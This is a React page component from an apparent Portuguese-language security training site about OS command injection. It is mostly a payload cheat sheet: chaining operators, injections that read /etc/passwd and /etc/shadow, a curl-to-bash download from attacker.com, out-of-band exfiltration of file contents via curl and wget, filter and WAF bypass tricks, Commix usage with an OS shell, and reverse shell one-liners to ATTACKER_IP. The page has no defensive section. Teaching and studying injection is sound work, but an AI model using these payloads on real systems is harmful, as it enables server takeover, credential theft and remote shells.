import { PageContainer } from "@/components/layout/PageContainer";
import { CodeBlock } from "@/components/ui/CodeBlock";
import { AlertBox } from "@/components/ui/AlertBox";

export default function CommandInjection() {
  return (
    <PageContainer
      title="OS Command Injection"
      subtitle="Explore vulnerabilidades de injeção de comandos do sistema operacional em aplicações web e serviços."
      difficulty="intermediario"
      timeToRead="16 min"
    >
      <h2>O que é Command Injection?</h2>
      <p>
        <strong>OS Command Injection</strong> ocorre quando uma aplicação passa input do usuário
        diretamente para um comando do sistema operacional sem sanitização adequada. Isso permite
        ao atacante executar comandos arbitrários no servidor.
      </p>

      <AlertBox type="danger" title="Impacto crítico">
        Command injection geralmente resulta em acesso completo ao servidor (RCE). É uma das
        vulnerabilidades mais perigosas e está no OWASP Top 10.
      </AlertBox>

      <h2>Operadores de Injeção</h2>
      <CodeBlock
        title="Operadores para encadear comandos"
        code={`# Ponto e vírgula — executa ambos
; whoami
# ping 8.8.8.8; whoami

# Pipe — saída do primeiro vai para o segundo
| whoami
# ping 8.8.8.8 | whoami

# AND — segundo executa se primeiro sucede
&& whoami
# ping 8.8.8.8 && whoami

# OR — segundo executa se primeiro falha
|| whoami
# ping invalidhost || whoami

# Background — executa em paralelo
& whoami
# ping 8.8.8.8 & whoami

# Backticks — substituição de comando
\`whoami\`
# ping \`whoami\`.attacker.com

# $() — substituição de comando (bash)
$(whoami)
# ping $(whoami).attacker.com

# Newline — nova linha
%0a whoami
# ping 8.8.8.8%0awhoami`}
      />

      <h2>Cenários de Exploração</h2>

      <CodeBlock
        title="Exemplos práticos de command injection"
        code={`# Cenário 1: Ferramenta de ping na web
# URL: http://alvo.com/ping?host=8.8.8.8
# Backend: os.system("ping -c 3 " + host)

# Payloads:
8.8.8.8; cat /etc/passwd
8.8.8.8 && id
8.8.8.8 | ls -la /
8.8.8.8; curl http://attacker.com/shell.sh | bash

# Cenário 2: Conversão de arquivos
# URL: http://alvo.com/convert?file=doc.pdf
# Backend: system("convert " + file + " output.png")

# Payloads:
doc.pdf; whoami
doc.pdf\`id\`
doc.pdf$(cat /etc/shadow)

# Cenário 3: DNS lookup
# URL: http://alvo.com/lookup?domain=example.com
# Backend: exec("nslookup " + domain)

# Payloads:
example.com; id
example.com | cat /etc/passwd`}
      />

      <h2>Blind Command Injection</h2>
      <CodeBlock
        title="Detectar injection sem ver output"
        code={`# Time-based — medir diferença de tempo
; sleep 10         # Resposta demora 10s? Vulnerável!
| sleep 5
&& sleep 5

# DNS exfiltration — usar callback
; nslookup $(whoami).attacker.com
; curl http://attacker.com/$(id | base64)
; wget http://attacker.com/?data=$(cat /etc/passwd | base64)

# Usando Burp Collaborator
; nslookup $(whoami).XXXXX.burpcollaborator.net

# Arquivo como indicador
; touch /tmp/pwned
; echo "owned" > /var/www/html/proof.txt
# Depois verificar: http://alvo.com/proof.txt

# Out-of-band via ping
; ping -c 3 attacker-ip
# Monitorar com: sudo tcpdump icmp -i eth0`}
      />

      <h2>Bypass de Filtros</h2>
      <CodeBlock
        title="Contornar filtros e WAFs"
        code={`# Espaço bloqueado
cat\${IFS}/etc/passwd        # IFS = separador interno
{cat,/etc/passwd}            # Brace expansion
cat<>/etc/passwd             # Redirecionamento
cat\t/etc/passwd             # Tab (%09)

# Palavras bloqueadas (cat, whoami, etc.)
c'a't /etc/passwd            # Aspas simples
c"a"t /etc/passwd            # Aspas duplas
c\\at /etc/passwd             # Backslash
/bin/c?t /etc/passwd         # Wildcard
/bin/ca* /etc/passwd         # Wildcard
$(printf 'cat') /etc/passwd  # Printf

# Codificação
echo "Y2F0IC9ldGMvcGFzc3dk" | base64 -d | bash
# = cat /etc/passwd em base64

# Variáveis de ambiente
$HOME → /root
$(echo /etc/passwd) → /etc/passwd

# Hex
echo -e "\\x63\\x61\\x74 /etc/passwd" | bash

# Concatenação
a]c]a]t /etc/passwd   # Com 'a]' sendo ignorado
w'h'o'a'm'i`}
      />

      <h2>Ferramentas</h2>
      <CodeBlock
        title="Automação de command injection"
        code={`# Commix — ferramenta automatizada
sudo apt install commix

# Scan básico
commix -u "http://alvo.com/ping?host=8.8.8.8"

# Especificar parâmetro
commix -u "http://alvo.com/page" --data="host=8.8.8.8" -p host

# Com cookie de sessão
commix -u "http://alvo.com/ping?host=test" \\
  --cookie="session=abc123"

# Modo interativo (shell)
commix -u "http://alvo.com/ping?host=test" --os-shell

# Burp Suite — Intruder
# 1. Capturar requisição
# 2. Marcar parâmetro
# 3. Payload: lista de operadores + comandos
# 4. Analisar respostas`}
      />

      <h2>Reverse Shell via Command Injection</h2>
      <CodeBlock
        title="Obter shell reverso"
        code={`# Na máquina atacante:
nc -lvnp 4444

# Payloads de reverse shell via injection:
; bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1

; python3 -c 'import socket,subprocess;s=socket.socket();s.connect(("ATTACKER_IP",4444));subprocess.call(["/bin/bash","-i"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())'

; rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc ATTACKER_IP 4444 >/tmp/f

# URL encoded (para GET):
%3B%20bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2FATTACKER_IP%2F4444%200%3E%261`}
      />
    </PageContainer>
  );
}
